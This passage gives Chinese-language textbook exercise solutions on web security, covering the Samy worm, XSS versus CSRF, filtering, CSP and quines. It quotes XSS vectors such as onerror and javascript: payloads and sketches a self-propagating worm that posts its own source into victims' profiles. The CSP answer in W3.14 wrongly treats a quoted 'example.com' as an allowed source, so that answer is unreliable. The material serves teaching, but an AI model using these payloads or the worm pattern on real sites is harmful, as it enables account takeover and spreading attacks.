xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("pageid=5");
```

---

### **W3.3. Samy Worm 代码中的自我检查**

**题目转述**：
在书中的 Listing C.2 (Samy Worm 攻击代码) 中，在发送 Ajax 请求修改 Samy 自己的个人资料之前，加了一个检查。
1.  这个检查的主要目的是什么？
2.  如果不加这个检查，攻击能成功吗？
3.  为什么在“添加好友”的攻击代码 (Listing C.1) 中不需要这样的检查？

**解答**：
1.  **目的**：防止**自我感染 (Self-infection)**。检查的目的是确认当前被浏览的个人资料页面 *不是* Samy 自己的页面。如果不加检查，Samy 访问自己的页面时，蠕虫代码会再次运行，试图用相同的蠕虫代码覆盖他原本的恶意代码（或者造成死循环/数据损坏）。
2.  **不加检查的后果**：攻击对其他受害者仍然**可以成功**。但是，当 Samy 自己查看受感染的页面或自己的页面时，脚本会尝试修改他自己的资料，这可能会导致他的原始 Payload 出错或被意外覆盖。
3.  **添加好友为何不需要**：在大多数社交网络逻辑中，**用户不能添加自己为好友**。API 通常会忽略“添加自己”的请求，或者返回错误但不会造成破坏性后果，因此不需要额外的代码来防止这种情况。

---

### **W3.4. 浏览器端过滤 (Browser-side Filtering) 有效吗？**

**题目转述**：
开发者决定在浏览器端实施过滤。在数据发送到服务器之前，通过 JavaScript 过滤掉其中的恶意代码。假设过滤逻辑是完美的，这种方法能防止 XSS 攻击吗？

**解答**：
**不能 (No)**。
浏览器端的过滤只能防御普通用户通过浏览器界面进行的输入。攻击者可以使用工具（如 `curl`、Postman、Burp Suite）或者编写脚本，**绕过浏览器**直接向服务器发送包含恶意代码的 HTTP 请求。服务器接收到这些未经过滤的数据并存储，当其他用户访问该页面时，恶意代码就会从服务器传送到受害者的浏览器并执行。安全过滤必须在**服务器端 (Server-side)** 进行。

---

### **W3.5. XSS 与 CSRF 的区别**

**题目转述**：
XSS 和 CSRF 攻击的区别是什么？

**解答**：
*   **XSS (Cross-Site Scripting)**：
    *   **核心机制**：**代码注入**。攻击者将恶意脚本（JavaScript）注入到受信任的网站中。
    *   **执行上下文**：恶意脚本在受害者的浏览器中运行，被浏览器认为是网站的一部分。
    *   **目标**：通常用于窃取数据（如 Cookies、Token）、篡改页面内容或代表用户执行操作。
*   **CSRF (Cross-Site Request Forgery)**：
    *   **核心机制**：**请求伪造**。攻击者诱导受害者（在已登录状态下）加载一个第三方页面，该页面向目标网站发送请求。
    *   **利用信任**：利用了“服务器信任浏览器发送的凭证（如 Cookie）”这一特点。
    *   **目标**：借用受害者的身份执行状态改变操作（如转账、改密），攻击者拿不到响应数据，只能执行动作。

---

### **W3.6. Secret Token 能防御 XSS 吗？**

**题目转述**：
Secret Token（通常用于防御 CSRF 的手段）能用来防御 XSS 攻击吗？

**解答**：
**不能 (No)**。
Secret Token 依赖于攻击者无法读取该 Token 的假设。在 XSS 攻击中，恶意 JavaScript 代码运行在受害者的浏览器中，与页面同源。因此，恶意脚本可以通过 DOM 操作（例如 `document.getElementById` 或 `document.getElementsByName`）轻松**读取页面上的 Secret Token**，并将其包含在恶意请求中发送。

---

### **W3.7. Same-Site Cookie 能防御 XSS 吗？**

**题目转述**：
Same-Site Cookie（CSRF 的防御手段）能用来防御 XSS 攻击吗？

**解答**：
**不能 (No)**。
SameSite Cookie 的作用是防止 Cookie 在跨站请求（Cross-Site request）中被发送。然而，XSS 攻击的代码是注入在目标网站内部的，代码执行时发出的请求属于**同源请求 (Same-Origin request)** 或在当前域上下文中执行。因此，浏览器会正常发送 SameSite Cookie，攻击者依然可以窃取 Session 或执行操作。

---

### **W3.8. 仅过滤 `<script>` 标签够吗？**

**题目转述**：
为了过滤用户输入中的 JavaScript 代码，我们是否可以只查找 `<script>` 标签并将其移除？

**解答**：
**不够 (No)**。
JavaScript 可以通过多种方式执行，不仅仅是 `<script>` 标签。
例如：
1.  **事件处理程序**：`<img src=x onerror=alert(1)>` 或 `<body onload=alert(1)>`。
2.  **伪协议**：`<a href="javascript:alert(1)">Click me</a>`。
3.  **CSS/Style**：在某些旧浏览器中，CSS 也可以执行 JS。
仅过滤 `<script>` 标签会遗漏大量 XSS 攻击向量。

---

### **W3.9. 改进浏览器以减少 XSS 风险**

**题目转述**：
如果你能修改浏览器的行为，你会添加什么功能来帮助减少 XSS 攻击的风险？

**解答**：
这是一个开放性问题，以下是标准的安全机制思路：
1.  **完善 CSP (Content Security Policy)**：强制浏览器只执行白名单内的脚本，禁止内联脚本 (Inline Scripts) 和 `eval()`。
2.  **HttpOnly Cookies**：默认强制敏感 Cookie 使用 HttpOnly 标志，防止 JavaScript 读取。
3.  **XSS 过滤器 (XSS Auditor)**：虽然现代浏览器已弃用，但在理论上，浏览器可以分析请求和响应，拦截反射型 XSS。
4.  **沙盒机制 (Sandboxing)**：对 iframe 或特定上下文进行严格隔离，限制脚本访问父页面 DOM 或 Cookie。

---

### **W3.10. 编写 Quine 程序 (自我复制)**

**题目转述**：
Quine 是一种不接受输入但输出其自身源代码的程序。Listing 10.3 的蠕虫不是 Quine，因为它从 DOM 读取数据。
1.  请编写一个 Quine 程序，放入 Elgg 用户资料中。当有人访问时，它会执行并在警告框中打印出它自己的副本。
2.  (挑战) 重写 Listing 10.3，使其成为一个真正的 Quine（完全依靠代码生成自身，而不从 DOM 读取），并能完成原本的攻击功能。

**解答**：
**第一部分：简单的 JavaScript Quine (用于 Alert)**
这是一个经典的 JS Quine 结构，它利用函数转换为字符串的能力：

```javascript
<script>
(function q(){
    alert("(" + q.toString() + ")()");
})()
</script>
```
当这段代码执行时，它会定义函数 `q`，然后立即调用它。`q.toString()` 会返回函数的源码，拼凑后正好是原本的代码。

**第二部分：概念性思路 (Worm Quine)**
要让蠕虫成为 Quine 并自我复制到受害者资料中，代码结构大致如下：
```javascript
(function w(){
    var code = "(" + w.toString() + ")()"; // 获取自身源码
    // 这里编写 AJAX 代码
    var xhr = new XMLHttpRequest();
    // ... 配置 POST 请求 ...
    // 将 code 变量作为 payload 的一部分发送，写入受害者的 profile
    // ... xhr.send("description=" + encodeURIComponent(code) + "...");
})()
```
*关键点是利用 `arguments.callee.toString()` (旧版) 或给函数命名后调用 `.toString()` 来获取源码，而不是通过 `document.getElementById` 获取页面上的 HTML。*

---

### **W3.11. 代码与数据混合的危害 (其他例子)**

**题目转述**：
XSS 的根本原因是 HTML 允许代码和数据混合。请提供另外两个因为代码与数据混合而导致安全问题的例子。

**解答**：
1.  **SQL 注入 (SQL Injection)**：
    *   用户输入的数据（Data）被直接拼接进 SQL 查询语句（Code）中，导致数据库将其误认为是 SQL 命令执行。
2.  **缓冲区溢出 (Buffer Overflow)**：
    *   在内存中，如果程序没有正确检查输入数据的长度，恶意输入的数据可能会覆盖栈上的返回地址（Return Address）。CPU 随后会将这些数据当作指令（Code）来执行。
3.  *(备选)* **命令注入 (Command Injection)**：
    *   用户输入的数据被直接传递给系统 Shell（如 `system()` 函数），被 Shell 当作操作系统命令执行。

---

### **W3.12. CSP 为何有效及其缺点**

**题目转述**：
为什么 CSP (内容安全策略) 能有效防御 XSS？这种方法的缺点是什么？

**解答**：
*   **为什么有效**：
    *   **白名单机制**：CSP 允许网站管理员明确指定哪些源（Domain）的脚本是允许执行的。
    *   **禁止内联**：CSP 默认禁止内联脚本（`<script>...</script>`）和 `javascript:` 伪协议，这直接阻断了最常见的 XSS 注入方式。
    *   **禁止 Eval**：CSP 可以禁止 `eval()` 等将字符串转换为代码执行的函数。
*   **缺点**：
    *   **配置困难**：为大型旧网站创建正确的策略非常耗时，容易破坏现有功能。
    *   **兼容性与维护**：如果网站频繁引入第三方脚本，维护白名单很麻烦；且部分旧浏览器可能不支持。

---

### **W3.13. CSP 能防御 CSRF 吗？**

**题目转述**：
CSP 能用来防御 CSRF 攻击吗？为什么？

**解答**：
**不能 (No)** (或者说非常有限)。
*   **原因**：CSP 的主要目的是限制**当前页面内**可以加载和执行什么资源（Script, Image, etc.）。
*   CSRF 攻击是攻击者诱导受害者的浏览器向**服务器**发送请求。如果攻击者在 `evil.com` 上构建了一个表单提交到 `bank.com`，`bank.com` 上的 CSP 策略无法阻止 `evil.com` 发送这个请求。虽然 CSP 有 `form-action` 指令可以限制当前页面表单提交的目标，但它无法阻止来自**外部网站**的伪造请求。防御 CSRF 依然主要靠 Anti-CSRF Token 或 SameSite Cookies。

---

### **W3.14. 分析 CSP 代码执行情况**

**题目转述**：
给定的 PHP 代码设置了如下 CSP 头部：
`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-1rA2345' 'example.com'`
请分析下方的 HTML 中哪些 JavaScript 代码允许执行。

**分析规则**：
*   `default-src 'self'`：默认只允许同源。
*   `script-src ...`：覆盖了脚本的规则。
    *   `'self'`：允许加载同源的脚本**文件**。
    *   `'nonce-1rA2345'`：允许带有此 nonce 的内联脚本。
    *   `'example.com'`：允许来自该域的脚本文件。
*   **注意**：一旦指定了 `nonce` 或特定源，通常意味着没有 `'unsafe-inline'`，因此没有正确 Nonce 的内联脚本会被阻止。

**解答**：

1.  `<script ... nonce="1rA2345"> ... ➊`
    *   **允许 (Allowed)**。Nonce 匹配策略中的 `'nonce-1rA2345'`。

2.  `<script ... nonce="2rB3333"> ... ➋`
    *   **阻止 (Blocked)**。Nonce 值 (`2rB3333`) 与策略不匹配。

3.  `<script type="text/javascript"> ... ➌`
    *   **阻止 (Blocked)**。这是一个内联脚本（Inline Script），没有 Nonce，且策略中没有启用 `'unsafe-inline'`。

4.  `<script src="script.js"> </script> ➍`
    *   **允许 (Allowed)**。这是一个外部脚本文件，假设 `script.js` 位于同源服务器上，它匹配 `'self'`。

5.  `<script src="https://example.com/script2.js"> ... ➎`
    *   **允许 (Allowed)**。源 `example.com` 在白名单中。

6.  `<button onclick="alert('hello')"> ... ➏`
    *   **阻止 (Blocked)**。这是内联事件处理程序（Inline Event Handler）。CSP 默认禁止这种写法，除非设置了 `'unsafe-inline'`（此策略中未设置）。